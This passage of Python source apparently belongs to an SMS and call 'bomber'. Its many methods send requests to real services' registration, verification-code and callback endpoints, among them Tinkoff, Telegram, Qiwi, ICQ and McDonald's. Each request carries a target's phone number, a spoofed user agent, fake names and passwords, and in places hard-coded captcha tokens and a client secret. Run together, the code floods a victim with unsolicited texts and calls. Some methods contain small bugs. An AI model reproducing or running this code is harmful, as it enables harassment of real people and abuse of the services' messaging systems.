        requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php', data={'msisdn':self.phone_not_pluse,
         'locale':'en',
         'countryCode':'ru',
         'version':'1',
         'k':'ic1rtwz1s1Hj1O0r',
         'r':'46763'},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',
         'Pragma':'no-cache',
         'Cache-Control':'no-cache',
         'Accept-Encoding':'gzip, deflate, br',
         'User-Agent':user_agent(),
         'DNT':'1'})

    def comfy_ua(self):
        requests.post('https://comfy.ua/ua/customer/account/createPost', data={'registration_name':_ru_name_(),  'registration_phone':self.phone,  'registration_email':email()}, headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',
         'Pragma':'no-cache',
         'Cache-Control':'no-cache',
         'Accept-Encoding':'gzip, deflate, br',
         'User-Agent':user_agent(),
         'DNT':'1'})

    def foxtrot(self):
        requests.post('https://www.foxtrot.com.ua/ru/account/sendcodeagain?Length=12', data={'Phone': self.phone}, headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',
         'Pragma':'no-cache',
         'Cache-Control':'no-cache',
         'Accept-Encoding':'gzip, deflate, br',
         'User-Agent':user_agent(),
         'DNT':'1'})

    def panda99(self):
        requests.post('https://panda99.ru/bdhandlers/order.php?t={int(time())}', data={'CB_NAME':_ru_name_(),
         'CB_PHONE':self.phone},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',
         'Pragma':'no-cache',
         'Cache-Control':'no-cache',
         'Accept-Encoding':'gzip, deflate, br',
         'User-Agent':user_agent(),
         'DNT':'1'})

    def grabtaxi(self):
        requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber':self.phone,  'countryCode':'ID',  'name':name(),  'email':email(),  'deviceToken':'*'}, headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',
         'Pragma':'no-cache',
         'Cache-Control':'no-cache',
         'Accept-Encoding':'gzip, deflate, br',
         'User-Agent':user_agent(),
         'DNT':'1'})

    def moscow(self):
        requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'1': self.phone}, headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',
         'Pragma':'no-cache',
         'Cache-Control':'no-cache',
         'Accept-Encoding':'gzip, deflate, br',
         'User-Agent':user_agent(),
         'DNT':'1'})

    def tinkoff(self):
        requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': self.phone}, headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',
         'Pragma':'no-cache',
         'Cache-Control':'no-cache',
         'Accept-Encoding':'gzip, deflate, br',
         'User-Agent':user_agent(),
         'DNT':'1'})

    def citrus(self):
        requests.post('https://my.citrus.ua/api/v2/register', data={'email':email(),  'name':name(),  'phone':self.phone,  'password':'!@#qwe',  'confirm_passwor':'!@#qwe'}, headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',
         'Pragma':'no-cache',
         'Cache-Control':'no-cache',
         'Accept-Encoding':'gzip, deflate, br',
         'User-Agent':user_agent(),
         'DNT':'1'})

    def ubepmsmorg(self):
        requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={'phone': self.phone}, headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',
         'Pragma':'no-cache',
         'Cache-Control':'no-cache',
         'Accept-Encoding':'gzip, deflate, br',
         'User-Agent':user_agent(),
         'DNT':'1'})

    def plink_tech(self):
        requests.post('https://plink.tech/register/', json={'phone': self.phone}, headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def kasta(self):
        requests.post('https://kasta.ua/api/v2/login/', data={'phone': self.phone},
          headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def cabinet_wi_fi(self):
        requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': self.phone}, headers={'App-ID': 'cabinet'})

    def e_vse(self):
        requests.post('https://e-vse.online/mail2.php', data=("{'object':'callback','user_name': " + name() + ",'contact_phone':" + self.phone + '}'), headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',
         'Pragma':'no-cache',
         'Cache-Control':'no-cache',
         'Accept-Encoding':'gzip, deflate, br',
         'User-Agent':user_agent(),
         'DNT':'1'})

    def protovar(self):
        requests.post('https://protovar.com.ua/aj_record', data={'telephone': self.phone},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',
         'Pragma':'no-cache',
         'Cache-Control':'no-cache',
         'Accept-Encoding':'gzip, deflate, br',
         'User-Agent':user_agent(),
         'DNT':'1'})

    def yapochink(self):
        requests.post('https://yaponchik.net/login/login.php',
          data={'login':'Y',
         'countdown':0,
         'step':'phone',
         'redirect':'/profile/',
         'phone':self.phone_mask},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def youla(self):
        requests.post('https://youla.ru/web-api/auth/request_code',
          data={'phone': self.phone},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',
         'Pragma':'no-cache',
         'Cache-Control':'no-cache',
         'Accept-Encoding':'gzip, deflate, br',
         'User-Agent':user_agent(),
         'DNT':'1'})

    def zoopt(sefl):
        requests.post('https://zoopt.ru/api/',
          data={'module':'salin.core',
         'class':'BonusServer\\Auth',
         'action':'SendSms',
         'phone':self.phone_mask},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',
         'Pragma':'no-cache',
         'Cache-Control':'no-cache',
         'Accept-Encoding':'gzip, deflate, br',
         'User-Agent':user_agent(),
         'DNT':'1'})

    def friendsclub(self):
        requests.post('https://friendsclub.ru/assets/components/pl/connector.php',
          data={'casePar':'authSendsms',
         'MobilePhone':self.phone},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',
         'Pragma':'no-cache',
         'Cache-Control':'no-cache',
         'Accept-Encoding':'gzip, deflate, br',
         'User-Agent':user_agent(),
         'DNT':'1'})

    def fixprice(self):
        requests.post('https://fix-price.ru/ajax/register_phone_code.php',
          data={'register_call':'Y',
         'action':'getCode',
         'phone':self.phone})

    def smartomato(self):
        requests.post('https://2407.smartomato.ru/account/session',
          json={'phone':self.phone_mask,
         'g-recaptcha-response':None},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def etm(self):
        requests.post('https://www.etm.ru/cat/runprog.html',
          data={'m_phone':self.phone,
         'mode':'sendSms',
         'syf_prog':'clients-services',
         'getSysParam':'yes'},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

        requests.post('https://www.etm.ru/cat/runprog.html',
          data={'m_phone':self.phone_not_pluse[1:],
         'mode':'sendSms',
         'syf_prog':'clients-services',
         'getSysParam':'yes'},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def derevenskoe(self):
        requests.post('https://esh-derevenskoe.ru/index.php?route=checkout/checkout_ajax/sendcode&ajax=yes',
          data={'need_reg':'1',
         'phone':self.phone},
          headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def groshi(self):
        requests.post('https://e-groshi.com/online/reg',
          data={'first_name':_ru_name_(),
         'last_name':_ru_name_(),
         'third_name':_ru_name_(),
         'phone':self.phone,
         'password':password(),
         'password2':password()},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def edostav(self):
        requests.post('https://vladimir.edostav.ru/site/CheckAuthLogin',
          data={'phone_or_email': self.phone},
          headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def easypay(self):
        requests.post('https://api.easypay.ua/api/auth/register',
          json={'phone':self.phone,
         'password':password()},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',
         'Pragma':'no-cache',
         'Cache-Control':'no-cache',
         'Accept-Encoding':'gzip, deflate, br',
         'User-Agent':user_agent(),
         'DNT':'1'})

    def delitime(self):
        requests.post('https://api.delitime.ru/api/v2/signup',
          data={'SignupForm[username]':self.phone,
         'SignupForm[device_type]':3},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def creditter(self):
        requests.post('https://api.creditter.ru/confirm/sms/send',
          json={'phone':self.phone_mask,
         'type':'register'},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def cleversite(self):
        requests.post('https://clients.cleversite.ru/callback/run.php',
          data={'siteid':'62731',
         'num':self.phone,
         'title':'Онлайн-консультант',
         'referrer':'https://m.cleversite.ru/call'},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def carsmile(self):
        requests.post('https://api.carsmile.com/',
          json={'operationName':'enterPhone',
         'variables':{'phone': self.phone},
         'query':'mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n'},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def callmyphone(self):
        requests.post('https://callmyphone.org/do-call',
          data={'phone':self.phone,
         'browser':'undefined'},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',
         'Pragma':'no-cache',
         'Cache-Control':'no-cache',
         'Accept-Encoding':'gzip, deflate, br',
         'User-Agent':user_agent(),
         'DNT':'1'})

    def telegram(self):
        requests.post('https://my.telegram.org/auth/send_password',
          data=('phone=' + self.phone),
          headers={'User-Agent':'PASS',
         'User-Agent':user_agent(),  'DNT':'1'})

    def qiwi(self):
        requests.post('https://mobile-api.qiwi.com/oauth/authorize', headers={'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5',
         'DNT':'1'},
          data=("'response_type': 'urn:qiwi:oauth:response-type:confirmation-id', 'username': " + self.phone + ", 'client_id': 'android-qw', 'client_secret': 'zAm4FKq9UnSe7id'"))

    def zaminka(self):
        requests.post(('https://zaimika.com/contact?action=checkSms&phone=' + phone_mask(self.phone_not_pluse, '#(###)###-##-##') + '&typeCheck=check'), headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def buzzolls(self):
        requests.get('https://it.buzzolls.ru:9995/api/v2/auth/register',
          params={'phoneNumber': self.phone},
          headers={'keywordapi':'ProjectVApiKeyword',
         'usedapiversion':'3',  'User-Agent':user_agent()})

    def boosty(self):
        requests.post('https://api.boosty.to/oauth/phone/authorize',
          data={'client_id': self.phone},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',
         'Pragma':'no-cache',
         'Cache-Control':'no-cache',
         'Accept-Encoding':'gzip, deflate, br',
         'User-Agent':user_agent(),
         'DNT':'1'})

    def bluefin(self):
        requests.post('https://bluefin.moscow/auth/register/',
          data={'phone':phone_mask(self.phone_not_pluse[1:], '(###)###-##-##'),
         'sendphone':'Далее'},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def alfalife(self):
        requests.post('https://alfalife.cc/auth.php',
          data={'phone': self.phone},
          headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def beltelecom(self):
        requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': self.phone},
          headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def bamperby(self):
        requests.post('https://bamper.by/registration/?step=1',
          data={'phone':self.phone,
         'submit':'Запросить смс подтверждения',
         'rules':'on'},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def bartokyo(self):
        requests.post('https://bartokyo.ru/ajax/login.php',
          data={'user_phone': phone_mask(self.phone_not_pluse, '+# (###) ###-####')},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def avtobzvon(self):
        requests.post('https://avtobzvon.ru/request/makeTestCall',
          params={'to': phone_mask(self.phone_not_pluse[1:], '(###) ###-##-##')},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',
         'Pragma':'no-cache',
         'Cache-Control':'no-cache',
         'Accept-Encoding':'gzip, deflate, br',
         'User-Agent':user_agent(),
         'DNT':'1'})

    def oauth_av(self):
        requests.post('https://oauth.av.ru/check-phone',
          json={'phone': self.phone_mask},
          headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def api_prime(self):
        requests.post('https://api-prime.anytime.global/api/v2/auth/sendVerificationCode',
          data={'phone': self.phone},
          headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def apteka(self):
        requests.post('https://apteka.ru/_action/auth/getForm/',
          data={'form[NAME]':'',
         'form[PERSONAL_GENDER]':'',
         'form[PERSONAL_BIRTHDAY]':'',
         'form[EMAIL]':'',
         'form[LOGIN]':self.phone_mask,
         'form[PASSWORD]':password(),
         'get-new-password':'Получите пароль по SMS',
         'user_agreement':'on',
         'personal_data_agreement':'on',
         'formType':'simple',
         'utc_offset':'120'},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def alpari(self):
        requests.post('https://alpari.com/api/en/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
          headers={'User-Agent':user_agent(),
         'DNT':'1',  'Referer':'https://alpari.com/en/registration/'},
          json={'client_type':'personal',
         'email':email(),
         'mobile_phone':self.phone,
         'deliveryOption':'sms'})

    def aistaxi(self):
        requests.post('http://94.154.218.82:7201/api/account/register/sendConfirmCode',
          json={'phone': self.phone},
          headers={'X-Requested-With':'XMLHttpRequest',  'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def samaraetagi(self):
        headers = {'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',
         'Pragma':'no-cache',
         'Cache-Control':'no-cache',
         'Accept-Encoding':'gzip, deflate, br',
         'User-Agent':user_agent(),
         'DNT':'1'}
        requests.options(('https://ipoteka.domclick.ru/cas/rest/api/v2/users?phone=' + self.phone_not_pluse[1:]), headers=headers)
        requests.post(('https://domclick.ru/cas/rest/api/v3/users/entry/' + self.phone_not_pluse[1:] + '?registrationSmsRequired=false&source=topline'), headers=headers, data='{}')
        requests.options('https://api.domclick.ru/core/terms/api/open/v1/acceptanceRequest', headers=headers)
        requests.post('https://api.domclick.ru/core/terms/api/open/v1/acceptanceRequest', headers=headers)

    def nb99(self):
        requests.post('https://99nb.ru/predata_send.php', data={'product_id':'Shapka',
         'utm_source':' ',  'campaign':' ',  'utm_medium':' ',  'ga_tid':'UA-100030358-1',  'phone':f"8{phone_mask(self.phone_not_pluse[1:], '(###)+###-##-##')}",  'calc-uri':''},
          headers={'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',  'Pragma':'no-cache',  'Cache-Control':'no-cache',  'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def farpost(self):
        requests.get('https://www.farpost.ru/sign/recover/helper?ajax=1&text=+' + self.phone_not_pluse + '&mode=reg&referer=https%3A%2F%2Fwww.farpost.ru%2Fsign&strongMatch=0&showSource=1&farpostOnly=0&dromOnly=0&allowQuickRestoreLinks=0')
        requests.post('https://www.farpost.ru/sign', data={'radio':'reg',  'sign':self.phone})
        requests.get(f"https://www.farpost.ru/sign/confirm?sessionGeoId=0&sign={self.phone_not_pluse}&entrance=&registration=ok&ts=1606751018")

    def notecash(self):
        requests.post('https://notecash.ru/backend/send', headers={'User-Agent': user_agent()}, data=('phone-top=' + phone_mask(self.phone_not_pluse, '+# (###) ###-##-##') + '&r='))

    def id_ykt(self):
        requests.post('https://id.ykt.ru/api/v3/register/sendCode', headers={'User-Agent': user_agent()}, data={'phone': self.phone_not_pluse[1:]})

    def uteka(self):
        headers = {'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',
         'Pragma':'no-cache',
         'Cache-Control':'no-cache',
         'Accept-Encoding':'gzip, deflate, br',
         'User-Agent':user_agent(),
         'DNT':'1'}
        requests.options('https://uteka.ru/rpc/?method=auth.ValidateRegister', headers=headers)
        requests.post('https://uteka.ru/rpc/?method=auth.ValidateRegister', json={'jsonrpc':'2.0',  'id':'1',  'method':'auth.ValidateRegister',  'params':{'name':name(),  'phone':self.phone_not_pluse,  'email':email()}}, headers=headers)
        requests.options('https://uteka.ru/rpc/?method=auth.GetCode', headers=headers)

    def chibbis(self):
        requests.post('https://szr.chibbis.ru/account/requestverificationcode', headers={'User-Agent': user_agent()}, data={'PhoneNumber':phone_mask(self.phone_not_pluse, '+#(###) ###-####'),  'ResendToken':''})

    def syzran(self):
        requests.post('https://syzran.farfor.ru/callback/', data={'csrfmiddlewaretoken':'vWG9OCe8dXY2RqsiaxLdnnNEHcUkfoq7Pb8QkkYjjNlL0nNCtf9ovoMTXnE7M3DY',
         'phone':phone_mask(self.phone_not_pluse, '+# (###) ###-##-##')})

    def beeline_kz(self):
        requests.get(f"https://beeline.kz/restservices/telco/auth/{self.phone_not_pluse[1:]}/checkexists", headers={'Accept-Encoding':'gzip, deflate, br',
         'User-Agent':user_agent(),  'DNT':'1'})

    def gnevskii(self):
        requests.post('https://xn--b1abgnfccv2b.xn--p1ai/scripts/form-u18785.php', data={'custom_U18799':_ru_name_(),  'custom_U18791':self.phone,  'custom_U18795':'1'}, headers={'Accept-Encoding':'gzip, deflate, br',
         'User-Agent':user_agent(),  'DNT':'1'})

    def esk_ural(self):
        requests.post('https://lk.esk-ural.ru/application/v3/user/registration-validation', json={'phone': self.phone},
          headers={'Accept-Encoding':'gzip, deflate, br',  'User-Agent':user_agent(),  'DNT':'1'})

    def pikru(self):
        requests.post('https://api.pik.ru/v1/phone/check', json={'phone':phone_mask(self.phone_not_pluse, '+# (###) ###-##-##'),
         'service':'confirmRegistrationSmsPikru'},
          headers={'Accept-Encoding':'gzip, deflate, br',
         'User-Agent':user_agent(),  'DNT':'1'})

    def edame(self):
        requests.post('https://eda.me/ajax/getcall.php', json={'city':'Москва',
         'domain':'eda.me',  'tel':phone_mask(self.phone_not_pluse, '+# (###) ###-##-##'),  'comment':' '},
          headers={'Accept-Encoding':'gzip, deflate, br',
         'User-Agent':user_agent(),  'DNT':'1'})

    def vladimirvilkinetru(self):
        headers = {'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',
         'Pragma':'no-cache',
         'Cache-Control':'no-cache',
         'Accept-Encoding':'gzip, deflate, br',
         'User-Agent':user_agent(),
         'DNT':'1'}
        requests.get(f"https://vladimir.vilkinet.ru/runtime/sendpass/?phone={self.phone_not_pluse[1:]}", headers=headers)

    def remontnik(self):
        headers = {'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',
         'Pragma':'no-cache',
         'Cache-Control':'no-cache',
         'Accept-Encoding':'gzip, deflate, br',
         'User-Agent':user_agent(),
         'DNT':'1'}
        requests.post('https://www.remontnik.ru/api/v2/register/step_10/', json={'name':'Мастер',
         'email':email(),  'phone':self.phone_not_pluse,  'social':'false',  'time_zone':-180,  'screen_size':'2048×1080x24',  'system_fonts':'Arial, Arial Narrow, Bitstream Vera Sans Mono, Bookman Old Style, Century Schoolbook, Courier, Courier New, Helvetica, Palatino, Palatino Linotype, Times, Times New Roman',  'supercookie':'DOM localStorage, DOM sessionStorage'},
          headers=headers)

    def macdonal(self):
        headers = {'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',
         'Pragma':'no-cache',
         'Cache-Control':'no-cache',
         'Accept-Encoding':'gzip, deflate, br',
         'User-Agent':user_agent(),
         'DNT':'1'}
        requests.options('https://site-api.mcdonalds.ru/api/v1/user/login/phone', headers=headers)
        requests.post('https://site-api.mcdonalds.ru/api/v1/user/login/phone', json={'number':self.phone,  'g-recaptcha-response':'03AGdBq24rQ30xdNbVMpoibIqu-cFMr5eQdEk5cghzJhxzYHbGRXKwwJbJx7HIBqh5scCXIqoSm403O5kv1DNSrh6EQhj_VKqgzZePMn7RJC3ndHE1u0AwdZjT3Wjta7ozISZ2bTBFMaaEFgyaYTVC3KwK8y5vvt5O3SSts4VOVDtBOPB9VSDz2G0b6lOdVGZ1jkUY5_D8MFnRotYclfk_bRanAqLZTVWj0JlRjDB2mc2jxRDm0nRKOlZoovM9eedLRHT4rW_v9uRFt34OF-2maqFsoPHUThLY3tuaZctr4qIa9JkfvfbVxE9IGhJ8P14BoBmq5ZsCpsnvH9VidrcMdDczYqvTa1FL5NbV9WX-gOEOudLhOK6_QxNfcAnoU3WA6jeP5KlYA-dy1YxrV32fCk9O063UZ-rP3mVzlK0kfXCK1atTsBgy2p4N7MlR77lDY9HybTWn5U9V'}, headers=headers)

    def findclone(self):
        headers = {'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',
         'Pragma':'no-cache',
         'Cache-Control':'no-cache',
         'Accept-Encoding':'gzip, deflate, br',
         'User-Agent':user_agent(),
         'DNT':'1'}
        requests.get(f"https://findclone.ru/register?phone={self.phone}", headers=headers)

    def eshko(self):
        headers = {'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',
         'Pragma':'no-cache',
         'Cache-Control':'no-cache',
         'Accept-Encoding':'gzip, deflate, br',
         'User-Agent':user_agent(),
         'DNT':'1'}
        requests.post('https://www.eshko.by/orders/create/free_download', data={'kurs':'1',
         'iname':_ru_name_(),  'fname':_ru_name_(),  'email':email(),  'phone':self.phone},
          headers=headers)

    def dtrparts(self):
        headers = {'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',
         'Pragma':'no-cache',
         'Cache-Control':'no-cache',
         'Accept-Encoding':'gzip, deflate, br',
         'User-Agent':user_agent(),
         'DNT':'1'}
        requests.post('https://dtrparts.by/', headers=headers, data={'mark':name(),  'text-breake':' ',  'phone':self.phone,  'submit':'%D0%A0%D0%B0%D1%81%D1%81%D1%87%D0%B8%D1%82%D0%B0%D1%82%D1%8C'})

    def smsint2(self):
        headers = {'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',
         'Pragma':'no-cache',
         'Cache-Control':'no-cache',
         'Accept-Encoding':'gzip, deflate, br',
         'User-Agent':user_agent(),
         'DNT':'1'}
        requests.post('https://smsint.ru/bitrix/templates/sms_intel/ajax/registration.php', data={'phone':self.phone_not_pluse,
         'name':_ru_name_(),  'code':' ',  'fpc':'null'},
          headers=headers)

    def turbosms(self):
        headers = {'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',
         'Pragma':'no-cache',
         'Cache-Control':'no-cache',
         'Accept-Encoding':'gzip, deflate, br',
         'User-Agent':user_agent(),
         'DNT':'1'}
        requests.post('https://turbosms.ua/registration.html', data={'country':'1',
         'login':username(),  'phone':self.phone_not_pluse[1:],  'email':email(),  'password':'dfgsdfgsdfg',
         'agry':'on',  'send':'%D0%97%D0%B0%D1%80%D0%B5%D0%B3%D0%B8%D1%81%D1%82%D1%80%D0%B8%D1%80%D0%BE%D0%B2%D0%B0%D1%82%D1%8C%D1%81%D1%8F'})

    def www360(self):
        headers = {'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',
         'Pragma':'no-cache',
         'Cache-Control':'no-cache',
         'Accept-Encoding':'gzip, deflate, br',
         'User-Agent':user_agent(),
         'DNT':'1'}
        requests.post('https://www.360.by/ajax/sendActivationStep', data={'phone':self.phone,
         'step':'phone_validate'},
          headers=headers)

    def delivio(self):
        headers = {'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',
         'Pragma':'no-cache',
         'Cache-Control':'no-cache',
         'Accept-Encoding':'gzip, deflate, br',
         'User-Agent':user_agent(),
         'DNT':'1'}
        requests.post('https://delivio.by/be/api/user/check', json={'phone': self.phone}, headers=headers)

    def carte(self):
        headers = {'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',
         'Pragma':'no-cache',
         'Cache-Control':'no-cache',
         'Accept-Encoding':'gzip, deflate, br',
         'User-Agent':user_agent(),
         'DNT':'1'}
        requests.post('https://carte.by/auth/', data={'ajax':'register',  'login':username(),  'pass':password(),  'phone':self.phone,  'company':0,  'resend':1,  'checksum':504}, headers=headers)

    def farmakopeika(self):
        headers = {'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',
         'Pragma':'no-cache',
         'Cache-Control':'no-cache',
         'Accept-Encoding':'gzip, deflate, br',
         'User-Agent':user_agent(),
         'DNT':'1'}
        requests.post('https://farmakopeika.ru/local/ajax/forms/re_call_form.php', data={'WEB_FORM_ID':1,  'sessid':'47ea89r6ca1b105894td0eea3a4e5f0g',  'phone':self.phone_not_pluse[1:],  'name':name()}, headers=headers)

    def farmacia24(self):
        headers = {'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',
         'Pragma':'no-cache',
         'Cache-Control':'no-cache',
         'Accept-Encoding':'gzip, deflate, br',
         'User-Agent':user_agent(),
         'DNT':'1'}
        requests.options(f"https://admin.24farmacia.ru/api_new/user/phone?phone={self.phone_not_pluse[1:]}", headers=headers)
        requests.get(f"https://admin.24farmacia.ru/api_new/user/phone?phone={self.phone_not_pluse[1:]}", headers=headers)

    def wowworks2(self):
        headers = {'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',
         'Pragma':'no-cache',
         'Cache-Control':'no-cache',
         'Accept-Encoding':'gzip, deflate, br',
         'User-Agent':user_agent(),
         'DNT':'1'}
        requests.options('https://api.wowworks.ru/v2/site/send-code/site/registration', headers=headers)
        requests.post('https://api.wowworks.ru/v2/site/send-code/site/registration', headers=headers, json={'phone':self.phone_not_pluse,  'validKey':'43aGdBq490DСiK4xRiКgF3moD1ou-oPDAnHakhad_YRRtWAl9W7pXP6jUijm9d2wNC5wiGeypWL2rD5i09ThyuOmM7QyDE0ROqB1cHJMoOP2vkgZSsWjIzCbGtkVfji1CLsxX0lpQ_tDhtqQ9yUzkLJX9XPb_1rQvQT3Ni14f04HV8zqZ-9c9VWTK50cZykfgmvW6qzVDEeGXO8tCyx8r1MREFJTi2VQJOnFncqhCQBbb9g1z0lZKpsaypJwdt6atEPan1Jv2Crb8UrKTYMhf_JTur5OOlOvJDmlD02H3b2j7xHOECtGxBhpxzfqeCL4C2gpplwAqNXw4zSg79T5o-S_PD21d9Uze3-Px84hFBc0dIZM0z324QYzKhgmLJCxuzFVADOLJsxevND84NQbNcme_ERc0cWGLnX6p33RhX-7jERFKXjuu3aQglyYg8S8Cuv-UlVQY25a-y'})

    def bigd_host(self):
        headers = {'X-Requested-With':'XMLHttpRequest',
         'Connection':'keep-alive',
         'Pragma':'no-cache',
         'Cache-Control':'no-cache',
